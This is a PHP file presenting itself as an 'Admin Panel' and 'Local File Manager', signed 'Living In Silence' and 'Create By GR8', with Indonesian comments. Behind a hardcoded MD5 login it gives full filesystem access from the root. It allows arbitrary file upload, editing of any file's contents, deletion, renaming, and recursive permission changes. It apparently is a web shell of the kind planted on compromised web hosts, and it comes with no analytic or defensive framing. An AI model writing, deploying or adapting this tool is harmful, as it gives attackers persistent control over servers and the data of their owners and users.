<?php
session_start();


$USERNAME = 'admin';
$PASSWORD_HASH = 'e4db63edff21ac5738f6289d765d6a0f'; 

if (!isset($_SESSION['logged_in'])) {
    if (isset($_POST['user'], $_POST['pass'])) {
        
        if ($_POST['user'] === $USERNAME && md5($_POST['pass']) === $PASSWORD_HASH) {
            $_SESSION['logged_in'] = true;
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $login_error = 'Username atau password salah';
        }
    }
    echo '
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <title>Login | Admin Panel</title>
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/admin-lte@3.2/dist/css/adminlte.min.css">
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css">
    </head>
    <body class="hold-transition login-page">
    <div class="login-box">
      <div class="login-logo">
        <b>Login</b> Admin Panel
      </div>
      <div class="card">
        <div class="card-body login-card-body">
          <p class="login-box-msg" style="color:red;">' . ($login_error ?? '') . '</p>
          <form method="post">
            <div class="input-group mb-3">
              <input name="user" type="text" class="form-control" placeholder="Username" required>
              <div class="input-group-append">
                <div class="input-group-text"><span class="fas fa-user"></span></div>
              </div>
            </div>
            <div class="input-group mb-3">
              <input name="pass" type="password" class="form-control" placeholder="Password" required>
              <div class="input-group-append">
                <div class="input-group-text"><span class="fas fa-lock"></span></div>
              </div>
            </div>
            <div class="row">
              <div class="col-12">
                <button type="submit" class="btn btn-primary btn-block">Login</button>
              </div>
            </div>
          </form>
        </div>
      </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/admin-lte@3.2/dist/js/adminlte.min.js"></script>
    </body>
    </html>';    
    exit;
}
$dir = $_GET['dir'] ?? __DIR__;
$disableUploadFlag = $dir . '/disable_upload.flag';
$message = '';

// Upload enable/disable
if (isset($_GET['disable_upload'])) file_put_contents($disableUploadFlag, '');
if (isset($_GET['enable_upload'])) @unlink($disableUploadFlag);

// Upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $target = $dir . '/' . basename($_FILES['file']['name']);
    $message = move_uploaded_file($_FILES['file']['tmp_name'], $target)
        ? "✅ Upload berhasil." : "❌ Gagal upload.";
}

// Fungsi tambahan
function isImmutable($file) {
    return false; // Sesuaikan jika ingin mendeteksi file terkunci
}

function getPerm($path) {
    return substr(sprintf('%o', fileperms($path)), -4);
}

function getAllowedRoot() {
    return '/'; // Bisa disesuaikan
}

// ======== CHMOD HANDLER ========
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['chmod_value'])) {
    $value = $_POST['chmod_value'];
    // Ambil target direktori yang dipilih dari input form
    $chmod_target = isset($_POST['chmod_target']) ? realpath($_POST['chmod_target']) : $dir;
    $allowedRoot = realpath(getAllowedRoot());

    // Keamanan: pastikan target berada di dalam root yang diizinkan
    if (strpos($chmod_target, $allowedRoot) !== 0) {
        $message = "❌ Path tidak diizinkan.";
    } else {
        // Recursive chmod function
        $errors = [];
        function chmodRecursive($path, $mode, &$errors) {
            if (!file_exists($path)) {
                $errors[] = "Tidak ditemukan: $path";
                return;
            }
            if (!chmod($path, $mode)) {
                $errors[] = "Gagal chmod: $path";
            }
            if (is_dir($path)) {
                foreach (scandir($path) as $item) {
                    if ($item === '.' || $item === '..') continue;
                    chmodRecursive($path . '/' . $item, $mode, $errors);
                }
            }
        }

        // CHMOD folder only
        if (isset($_POST['chmod'])) {
            $success = chmod($chmod_target, octdec($value));
            $message = $success ? "✅ Izin direktori berhasil diubah." : "❌ Gagal chmod.";
        }
        // CHMOD all files/folders one level
        elseif (isset($_POST['chmod_all'])) {
            foreach (scandir($chmod_target) as $item) {
                if ($item === '.' || $item === '..') continue;
                $target = $chmod_target . '/' . $item;
                if (!chmod($target, octdec($value))) {
                    $errors[] = "Gagal chmod: $target";
                }
            }
            $message = empty($errors)
                ? "✅ Semua item berhasil diubah."
                : "❌ Beberapa chmod gagal:<br>" . implode('<br>', $errors);
        }
        // CHMOD recursively
        elseif (isset($_POST['chmod_recursive'])) {
            chmodRecursive($chmod_target, octdec($value), $errors);
            $message = empty($errors)
                ? "✅ CHMOD rekursif berhasil."
                : "❌ Beberapa chmod gagal:<br>" . implode('<br>', $errors);
        }
    }
}
// Delete file/folder
if (isset($_GET['delete'])) {
    $target = realpath($dir . '/' . basename($_GET['delete']));
    if (is_dir($target)) rmdir($target);
    elseif (is_file($target)) unlink($target);
    header("Location: ?dir=" . urlencode($dir));
    exit;
}

// Rename
if (isset($_POST['rename_from'], $_POST['rename_to'])) {
    $from = $dir . '/' . basename($_POST['rename_from']);
    $to = $dir . '/' . basename($_POST['rename_to']);
    $message = rename($from, $to) ? "✅ Berhasil rename." : "❌ Gagal rename.";
}

// Create file
if (isset($_POST['create_file']) && $_POST['filename']) {
    $path = $dir . '/' . basename($_POST['filename']);
    if (!file_exists($path)) file_put_contents($path, '');
}

// Create folder
if (isset($_POST['create_folder']) && $_POST['foldername']) {
    $path = $dir . '/' . basename($_POST['foldername']);
    if (!file_exists($path)) mkdir($path);
}

// Edit file
if (isset($_POST['save_file']) && isset($_POST['file_content']) && isset($_POST['edit_file'])) {
    file_put_contents($dir . '/' . basename($_POST['edit_file']), $_POST['file_content']);
}

// Edit view
if (isset($_GET['edit'])) {
    $target = realpath($dir . '/' . basename($_GET['edit']));
    $content = htmlspecialchars(file_get_contents($target));
    echo "<h3>Edit File: {$_GET['edit']}</h3>
    <form method='post'>
        <textarea name='file_content' rows='20' cols='100'>{$content}</textarea><br>
        <input type='hidden' name='edit_file' value='{$_GET['edit']}'>
        <button type='submit' name='save_file'>Simpan</button>
    </form>
    <a href='?dir=" . urlencode($dir) . "'>Kembali</a>";
    exit;
}

function breadcrumb($dir) {
    $parts = explode('/', trim($dir, '/'));
    $path = '';
    $links = [];
    foreach ($parts as $p) {
        if ($p === '') continue;
        $path .= '/' . $p;
        $links[] = '<a href="?dir=' . urlencode($path) . '">' . htmlspecialchars($p) . '</a>';
    }
    return implode('/', $links);
}

$files = array_filter(scandir($dir), fn($f) => $f !== '.' && $f !== '..');
?>
<!DOCTYPE html>
<html>
<head>
    <title>Local File Manager</title>
    <style>
        body { font-family: sans-serif; padding: 20px; background: #f0f0f0; }
        table { border-collapse: collapse; width: 100%; background: #fff; margin-top: 20px; }
        th, td { border: 1px solid #ccc; padding: 8px; }
        th { background: #eee; }
        .locked { color: red; font-weight: bold; }
        .ok { color: green; }
        .upload-off { color: red; font-weight: bold; }
        .upload-on { color: green; font-weight: bold; }
        .chmod-form { display: inline-block; margin-left: 10px; }
    </style>
</head>
<body>
<center><h2>Living In Silence</h2></center>
<center><h3>Create By GR8</h3></center>
<p><strong>Path Direktori:</strong> <?= breadcrumb($dir) ?></p>
<p>jika path direktori berbeda dari ('/', 'home/', 'var/', 'opt/', 'mnt/', 'www/wwwroot/', 'home4'"), maka tambahkan di line 97 sesuai nama path yang sedang berjalan </p>
<?php if ($message): ?><p><strong><?= htmlspecialchars($message) ?></strong></p><?php endif; ?>

<form method="post">
    <input name="filename" placeholder="Nama File">
    <button name="create_file">Buat File</button>
</form>
<form method="post">
    <input name="foldername" placeholder="Nama Folder">
    <button name="create_folder">Buat Folder</button>
</form>
<form method="post">
    <input name="rename_from" placeholder="Nama Asal">
    <input name="rename_to" placeholder="Nama Baru">
    <button>Rename</button>
</form>
<!-- CHMOD form -->
<form method="post" id="chmodForm">
    <!-- Input untuk memilih direktori lain untuk chmod -->
    <input type="text" name="chmod_target" placeholder="Masukkan path direktori lain" value="<?= htmlspecialchars($dir) ?>" size="60">
    <input type="text" name="chmod_value" value="755" size="4" placeholder="Permission">
    <button type="submit" name="chmod">CHMOD Direktori</button>
    <button type="submit" name="chmod_all">CHMOD Semua File</button>
    <button type="button" onclick="confirmRecursive()">CHMOD Massal</button>
</form>

<script>
function confirmRecursive() {
    if (confirm("⚠️ Yakin ingin mengubah permission semua file dan folder secara rekursif?\nIni akan mempengaruhi semua isi direktori!")) {
        const form = document.getElementById("chmodForm");
        const hidden = document.createElement("input");
        hidden.type = "hidden";
        hidden.name = "chmod_recursive";
        hidden.value = "1";
        form.appendChild(hidden);
        form.submit();
    }
}
</script>

<?php if (!file_exists($disableUploadFlag)): ?>
<form method="POST" enctype="multipart/form-data" action="">
    <label for="file">Pilih file untuk diupload:</label><br>
    <input type="file" name="file" id="file" required>
    <button type="submit" name="upload_file">Upload</button>
</form>
<?php endif; ?>


<table>
    <tr><th>Nama</th><th>Jenis</th><th>Status</th><th>Izin</th><th>Aksi</th></tr>
    <?php foreach ($files as $item):
        $path = $dir . '/' . $item;
        $locked = is_file($path) && isImmutable($path);
        $perm = getPerm($path);
        $type = is_dir($path) ? 'Folder' : 'File';
    ?>
    <tr>
        <td>
            <?= is_dir($path) ? "<a href='?dir=" . urlencode($path) . "'>" . htmlspecialchars($item) . "</a>" : htmlspecialchars($item) ?>
        </td>
        <td><?= $type ?></td>
        <td><?= $locked ? '<span class="locked">Terkunci*</span>' : '<span class="ok">Bebas</span>' ?></td>
        <td><?= $perm ?></td>
        <td>
            <?php if (!is_dir($path)): ?>
                <a href='?edit=<?= urlencode($item) ?>&dir=<?= urlencode($dir) ?>'>Edit</a> |
            <?php endif; ?>
            <a href='?delete=<?= urlencode($item) ?>&dir=<?= urlencode($dir) ?>' onclick='return confirm("Yakin?")'>Hapus</a>
        </td>
    </tr>
    <?php endforeach; ?>
</table>

<p><a href="?logout=1">Logout</a></p>
</body>
</html>

<?php
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}
?>
